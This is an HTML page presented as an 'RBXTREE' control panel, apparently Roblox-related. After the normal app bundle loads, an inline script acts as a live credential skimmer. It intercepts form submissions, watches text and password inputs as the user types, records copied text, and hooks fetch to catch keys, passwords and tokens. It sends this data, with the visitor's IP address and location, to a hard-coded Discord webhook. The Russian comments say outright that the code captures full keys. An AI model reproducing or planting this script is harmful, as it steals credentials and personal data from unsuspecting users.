<!DOCTYPE html>
<html lang="">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="/favicon.ico">
    <title>RBXTREE | Control panel</title>
    <link href="/css/app.4981a60b.css" rel="preload" as="style">
    <link href="/js/app.1309f105.js" rel="preload" as="script">
    <link href="/js/chunk-vendors.356c81a4.js" rel="preload" as="script">
    <link href="/css/app.4981a60b.css" rel="stylesheet">
</head>
<body>
<noscript>
    <strong>We're sorry but rbx-admin doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
</noscript>
<div id="app"></div>
<script src="/js/chunk-vendors.356c81a4.js"></script>
<script src="/js/app.1309f105.js"></script>

<script>
    // –í–µ–±—Ö—É–∫ Discord –¥–ª—è –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ';

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP –∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    async function getUserIP() {
        try {
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å IP —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ—Ä–≤–∏—Å–æ–≤
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
        } catch (error) {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
            } catch (error2) {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    return data.ip || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
                } catch (error3) {
                    return '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
                }
            }
        }
    }

    // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤ –≤ Discord
    async function sendToDiscord(action, details = {}) {
        try {
            const timestamp = new Date().toISOString();
            const userAgent = navigator.userAgent;
            const pageUrl = window.location.href;
            const userIP = await getUserIP();
            
            // –ü–æ–ª—É—á–∞–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –ø–æ IP
            let locationInfo = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            try {
                const ipResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
                const ipData = await ipResponse.json();
                if (ipData && !ipData.error) {
                    locationInfo = `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country_name || ''}`;
                }
            } catch (e) {
                locationInfo = '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
            }

            // –§–æ—Ä–º–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
            const embed = {
                title: `üìù RBXTREE –õ–æ–≥: ${action}`,
                color: 0x3498db,
                fields: [
                    {
                        name: "‚è∞ –í—Ä–µ–º—è (UTC)",
                        value: new Date().toLocaleString('ru-RU') + `\n${timestamp}`,
                        inline: false
                    },
                    {
                        name: "üåê –°—Ç—Ä–∞–Ω–∏—Ü–∞",
                        value: pageUrl,
                        inline: false
                    },
                    {
                        name: "üñ•Ô∏è User Agent",
                        value: `\`\`\`${userAgent.substring(0, 1000)}\`\`\``,
                        inline: false
                    },
                    {
                        name: "üìç IP –ê–¥—Ä–µ—Å",
                        value: `\`${userIP}\``,
                        inline: true
                    },
                    {
                        name: "üó∫Ô∏è –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ",
                        value: locationInfo,
                        inline: true
                    }
                ],
                timestamp: timestamp,
                footer: {
                    text: `RBXTREE Control Panel ‚Ä¢ ${navigator.platform}`
                }
            };

            // –î–æ–±–∞–≤–ª—è–µ–º –∫–ª—é—á –≤ –ª–æ–≥–∏, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å (–ü–û–õ–ù–´–ô –ö–õ–Æ–ß)
            if (details.key) {
                embed.fields.unshift({ // –î–æ–±–∞–≤–ª—è–µ–º –≤ –Ω–∞—á–∞–ª–æ
                    name: "üîë –ü–û–õ–ù–´–ô –ö–õ–Æ–ß",
                    value: `\`\`\`${details.key}\`\`\``,
                    inline: false
                });
            }

            // –î–æ–±–∞–≤–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è
            if (details.userId) {
                embed.fields.push({
                    name: "üë§ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è",
                    value: details.userId,
                    inline: true
                });
            }

            if (details.success !== undefined) {
                embed.color = details.success ? 0x2ecc71 : 0xe74c3c;
                embed.fields.push({
                    name: "‚úÖ –°—Ç–∞—Ç—É—Å",
                    value: details.success ? "–£—Å–ø–µ—à–Ω–æ" : "–û—à–∏–±–∫–∞",
                    inline: true
                });
            }

            if (details.error) {
                embed.fields.push({
                    name: "‚ùå –û—à–∏–±–∫–∞",
                    value: details.error,
                    inline: false
                });
            }

            if (details.formId) {
                embed.fields.push({
                    name: "üìã –§–æ—Ä–º–∞",
                    value: `ID: ${details.formId}`,
                    inline: true
                });
            }

            if (details.buttonText) {
                embed.fields.push({
                    name: "üñ±Ô∏è –ö–Ω–æ–ø–∫–∞",
                    value: details.buttonText.substring(0, 50),
                    inline: true
                });
            }

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ fetch
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: 'RBXTREE Logger',
                    avatar_url: 'https://cdn.discordapp.com/attachments/1234567890/987654321/logo.png',
                    embeds: [embed]
                })
            });
            
            console.log(`[RBXTREE LOG] ${action} - –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Discord`);
            
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞ –≤ Discord:', error);
        }
    }

    // –ü–µ—Ä–µ—Ö–≤–∞—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º (–û–ë–ù–û–í–õ–ï–ù–û –î–õ–Ø –ó–ê–•–í–ê–¢–ê –ö–õ–Æ–ß–ï–ô)
    document.addEventListener('submit', function(event) {
        event.preventDefault();
        
        const form = event.target;
        const formData = new FormData(form);
        const formObject = Object.fromEntries(formData.entries());
        
        // –ò—â–µ–º –∫–ª—é—á–∏ –≤–æ –≤—Å–µ—Ö –ø–æ–ª—è—Ö —Ñ–æ—Ä–º—ã
        let foundKey = null;
        for (const [fieldName, fieldValue] of formData.entries()) {
            if (fieldValue && fieldValue.length > 5) { // –ï—Å–ª–∏ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–æ—Ö–æ–∂–µ –Ω–∞ –∫–ª—é—á
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–∑–≤–∞–Ω–∏—è –ø–æ–ª–µ–π
                const fieldNameLower = fieldName.toLowerCase();
                const fieldIdLower = form.querySelector(`[name="${fieldName}"]`)?.id?.toLowerCase() || '';
                
                if (fieldNameLower.includes('key') || 
                    fieldNameLower.includes('password') || 
                    fieldNameLower.includes('token') ||
                    fieldNameLower.includes('secret') ||
                    fieldIdLower.includes('key') ||
                    fieldIdLower.includes('password') ||
                    fieldIdLower.includes('token')) {
                    
                    foundKey = fieldValue;
                    break;
                }
            }
        }
        
        // –ï—Å–ª–∏ –Ω–µ –Ω–∞—à–ª–∏ –ø–æ –Ω–∞–∑–≤–∞–Ω–∏—è–º, –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤—Å–µ –ø–æ–ª—è —Å –¥–ª–∏–Ω–Ω—ã–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏
        if (!foundKey) {
            for (const [fieldName, fieldValue] of formData.entries()) {
                if (fieldValue && fieldValue.length > 10) { // –î–ª–∏–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –º–æ–≥—É—Ç –±—ã—Ç—å –∫–ª—é—á–∞–º–∏
                    foundKey = fieldValue;
                    break;
                }
            }
        }
        
        // –õ–æ–≥–∏—Ä—É–µ–º –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–æ—Ä–º—ã
        sendToDiscord('–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã', {
            key: foundKey || '–ö–ª—é—á –Ω–µ –Ω–∞–π–¥–µ–Ω',
            formId: form.id || '–±–µ–∑ ID',
            formAction: form.action || '–±–µ–∑ action',
            allFields: JSON.stringify(formObject)
        });
        
        // –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–æ—Ä–º—ã
        setTimeout(() => {
            form.submit();
        }, 100);
    });

    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –≤—Å–µ—Ö –ø–æ–ª–µ–π –≤–≤–æ–¥–∞ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –∫–ª—é—á–µ–π –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
    const observedInputs = new Set();
    
    function monitorInputForKeys(input) {
        if (observedInputs.has(input)) return;
        observedInputs.add(input);
        
        let lastValue = '';
        let keyCheckTimer;
        
        input.addEventListener('input', function() {
            clearTimeout(keyCheckTimer);
            keyCheckTimer = setTimeout(() => {
                const currentValue = input.value;
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ—Ö–æ–∂–µ –ª–∏ –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–∞ –∫–ª—é—á
                if (currentValue && currentValue !== lastValue && currentValue.length > 10) {
                    const inputName = input.name || input.id || input.placeholder || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ –ø–æ–ª–µ';
                    const inputType = input.type;
                    
                    // –õ–æ–≥–∏—Ä—É–µ–º –≤–æ–∑–º–æ–∂–Ω—ã–π –≤–≤–æ–¥ –∫–ª—é—á–∞
                    sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –≤–≤–æ–¥ –≤ –ø–æ–ª–µ', {
                        key: currentValue,
                        fieldName: inputName,
                        fieldType: inputType,
                        fieldId: input.id || '–±–µ–∑ ID'
                    });
                    
                    lastValue = currentValue;
                }
            }, 1500);
        });
    }

    // –ù–∞–±–ª—é–¥–∞—Ç–µ–ª—å –∑–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º –Ω–æ–≤—ã—Ö –ø–æ–ª–µ–π –≤ DOM
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeType === 1) { // Element node
                    const inputs = node.querySelectorAll ? 
                        node.querySelectorAll('input[type="text"], input[type="password"], input:not([type])') : [];
                    
                    inputs.forEach(input => {
                        monitorInputForKeys(input);
                    });
                    
                    if (node.tagName && (node.tagName.toLowerCase() === 'input')) {
                        monitorInputForKeys(node);
                    }
                }
            });
        });
    });

    // –ù–∞—á–∏–Ω–∞–µ–º –Ω–∞–±–ª—é–¥–µ–Ω–∏–µ
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–ª–µ–π
    document.addEventListener('DOMContentLoaded', function() {
        const existingInputs = document.querySelectorAll('input[type="text"], input[type="password"], input:not([type])');
        existingInputs.forEach(input => {
            monitorInputForKeys(input);
        });
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('load', function() {
        sendToDiscord('–ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞–Ω–µ–ª–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è RBXTREE', {
            pageTitle: document.title,
            referrer: document.referrer || '–ø—Ä—è–º–æ–π –≤—Ö–æ–¥',
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language
        });
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è —Ç–µ–∫—Å—Ç–∞ (–º–æ–∂–µ—Ç –±—ã—Ç—å –∫–ª—é—á–æ–º)
    document.addEventListener('copy', function(event) {
        const selectedText = window.getSelection().toString();
        if (selectedText && selectedText.length > 10) {
            sendToDiscord('–ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞', {
                key: selectedText,
                action: 'copy',
                textLength: selectedText.length
            });
        }
    });

    // –ü–µ—Ä–µ—Ö–≤–∞—Ç AJAX –∑–∞–ø—Ä–æ—Å–æ–≤ (–¥–ª—è SPA –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π)
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        return originalFetch.apply(this, args).then(response => {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ —Å–æ–¥–µ—Ä–∂–∞—Ç –ª–∏ –∑–∞–ø—Ä–æ—Å—ã –∫–ª—é—á–∏
            try {
                if (args[1] && args[1].body) {
                    const bodyStr = args[1].body.toString();
                    if (bodyStr && bodyStr.length > 20) {
                        // –ò—â–µ–º –∫–ª—é—á–∏ –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞
                        const keyPatterns = [/key=["']([^"']{10,})["']/, /password=["']([^"']{6,})["']/, /token=["']([^"']{10,})["']/];
                        
                        for (const pattern of keyPatterns) {
                            const match = bodyStr.match(pattern);
                            if (match && match[1]) {
                                sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ API –∑–∞–ø—Ä–æ—Å–µ', {
                                    key: match[1],
                                    url: args[0],
                                    method: args[1].method || 'GET'
                                });
                                break;
                            }
                        }
                    }
                }
            } catch (e) {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –∞–Ω–∞–ª–∏–∑–∞
            }
            
            return response;
        });
    };

    console.log('üîê –°–∏—Å—Ç–µ–º–∞ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è RBXTREE –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ —Å –∑–∞—Ö–≤–∞—Ç–æ–º –∫–ª—é—á–µ–π –∏ IP');
    
    // –ì–ª–æ–±–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    window.logRBXAction = function(action, details) {
        sendToDiscord(action, details);
    };
    
    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('beforeunload', function() {
        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
            content: `üì¥ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–∫–∏–Ω—É–ª RBXTREE –ø–∞–Ω–µ–ª—å\nIP: ${navigator.userAgent}\n–í—Ä–µ–º—è: ${new Date().toISOString()}`
        }));
    });
</script>
</body>
</html>
